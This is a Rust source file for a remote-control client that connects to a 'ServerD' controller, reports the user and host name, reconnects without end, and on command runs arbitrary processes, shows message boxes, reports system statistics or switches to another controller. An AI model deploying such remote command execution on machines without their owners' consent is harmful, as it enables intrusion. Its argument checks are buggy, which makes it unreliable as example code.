extern crate systemstat;

use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;
use std::{thread, time};

use anyhow::Result;
use systemstat::{saturating_sub_bytes, Platform, System};
use tracing::{debug, error, info};

use crate::addreses::Address;
use crate::unwrap::CustomUnwrap;
use crate::{lock_mutex, utils::*, TCP_ADDRESS};

pub fn connect() {
    // connect to the ServerD
    match Client::new(
        lock_mutex!(TCP_ADDRESS)
            .get(0)
            .unwrap_or(&Address::default())
            .format(),
    ) {
        Ok(mut client) => {
            info!("Connected!");

            // reconnect if error
            if let Err(e) = client.run() {
                error!("Unexpected error {e}");
                thread::sleep(time::Duration::from_secs(10));
                connect();
            }
        }
        // reconnect to the server
        Err(_e) => {
            error!("Unable to connect to the server. Reconnecting...");
            thread::sleep(time::Duration::from_secs(10));
            connect();
        }
    }
}

pub struct Client {
    stream: TcpStream,
    connected: bool,
}

impl Client {
    pub fn new(address: String) -> anyhow::Result<Self> {
        // connect to the server
        let stream = TcpStream::connect(address)?;

        Ok(Self {
            stream,
            connected: true,
        })
    }

    pub fn receive(&mut self) -> Result<String> {
        // allocate an empty buffer
        let mut data = [0; 65536];

        // read buffer
        let len = self.stream.read(&mut data)?;

        // get buffer without "empty" bytes
        let recv_buf = &data[0..len];

        // parse buffer into String
        let buf_str = String::from_utf8(recv_buf.to_vec())?;

        debug!("[Received]: {}", buf_str);

        Ok(buf_str)
    }

    /// Send a message to the server
    pub fn send(&mut self, message: &str) -> Result<()> {
        debug!("[Sended]: {}", message);

        // send message to the server
        self.stream.write_all(message.to_string().as_bytes())?;

        Ok(())
    }

    /// Send command to the server
    pub fn send_command(&mut self, message: &str) -> Result<String> {
        // send command
        self.send(message)?;

        // recive command output
        self.receive()
    }

    pub fn check_args(&mut self, args: Vec<&str>, length: usize) -> Result<bool> {
        if args.len() < length {
            self.send("Missing arguments")?;
            return Ok(false);
        } else if args.len() < length {
            self.send("To much arguments")?;
            return Ok(false);
        }

        Ok(true)
    }

    /// Clonse the connection
    pub fn close(&mut self) -> Result<()> {
        self.connected = false;

        self.stream.shutdown(std::net::Shutdown::Both)?;

        Ok(())
    }

    pub fn run(&mut self) -> Result<()> {
        info!("Client started working");

        // setup client name
        self.send_command(
            format!("/setname {}@{}", whoami::username(), whoami::hostname()).as_str(),
        )?;

        while self.connected {
            // recive message from the server
            let message = self.receive()?;

            // split message
            let command = message.split_ascii_whitespace().collect::<Vec<&str>>();

            // parse args to Vec
            let args = command[1..command.len()].to_vec();

            match command[0] {
                // send message box
                "msg" => {
                    if self.check_args(args.clone(), 1)? {
                        messagebox(args.join(" "));
                        self.send("Done")?;
                    }
                }

                // get system status
                "stat" => {
                    // get system status
                    let sys = System::new();

                    // init variables
                    let mut cpu_usage = 0.;
                    let mut memory_free = 0;
                    let mut memory_total = 0;
                    let mut swap_free = 0;
                    let mut swap_total = 0;

                    // get cpu usage
                    match sys.cpu_load_aggregate() {
                        Ok(cpu) => {
                            thread::sleep(Duration::from_secs(1));
                            let cpu = cpu.done().unwrap();
                            cpu_usage = cpu.user * 100.0;
                        }
                        Err(x) => {
                            error!("CPU load: error: {}", x);
                        }
                    }

                    // get memory stats
                    match sys.memory() {
                        Ok(mem) => {
                            memory_free = saturating_sub_bytes(mem.total, mem.free).as_u64();
                            memory_total = mem.total.as_u64();
                        }
                        Err(x) => {
                            error!("\nMemory: error: {}", x);
                        }
                    }

                    // get swap stats
                    match sys.swap() {
                        Ok(swap) => {
                            swap_free = saturating_sub_bytes(swap.total, swap.free).as_u64();
                            swap_total = swap.total.as_u64();
                        }
                        Err(x) => {
                            error!("\nMemory: error: {}", x);
                        }
                    }

                    // send stats to the server
                    self.send(&format!(
                        "{} {} {} {} {}",
                        cpu_usage, memory_free, memory_total, swap_free, swap_total
                    ))?;
                }
                "run" => {
                    if args.clone().len() < 1
                    {
                        self.send("Missing argument")?;
                    }
                    else
                    {
                        run_process(args[0],args[1],false);
                        self.send("Done")?;
                    }
                }

                // reconnect to the server
                "reconnect" => {
                    if self.check_args(args.clone(), 2)? {
                        match Client::new(format!("{}:{}", args[0], args[1])) {
                            Ok(mut client) => {
                                info!("Reconnected succesfully to {}:{}!", args[0], args[1]);

                                self.send("Succesfully reconnected client... disconnecting...")?;
                                self.send_command("/disconnect")?;
                                self.close()?;

                                client.run()?;
                            }
                            Err(_e) => {
                                error!("Error reconnecting to server");
                                self.send("Error reconnecting to server")?;
                            }
                        }
                    }
                }

                // disconnect from the server
                "disconnect" => {
                    self.send("Done")?;

                    self.send_command("/disconnect")?;
                    self.close()?;
                }

                "ping" => self.send("Ping received")?,

                // send help message
                "help" => {
                    let help = format!(
                        "{}{}{}{}{}{}{}{}{}{}{}{}",
                        "msg <message> - showing message\n",
                        "run <process> <args> - run process\n",
                        "reconnect <ip> <port> - reconnecting to another ServerD\n",
                        "disconnect - disconnecting ServerD Client\n",
                        "ping - sending ping\n",
                        "help - showing help\n",
                        "cd <dir> - changing dir",
                        "pwd - showing directory\n",
                        "ls - list files in dir\n",
                        "mkdir <name> - creating folder\n",
                        "rm <name> - removing file\n",
                        "cat <name> - reading file"
                    );
                    self.send(&help)?;
                }
                _ => self.send("Unknown command")?,
            }
        }

        Ok(())
    }
}

/// "Correctly" close connection
impl Drop for Client {
    #[allow(unused_must_use)]
    fn drop(&mut self) {
        self.send_command("/disconnect").expect_log("failed to send disconnect command");
        self.close().expect_log("failed to close connection");
    }
}
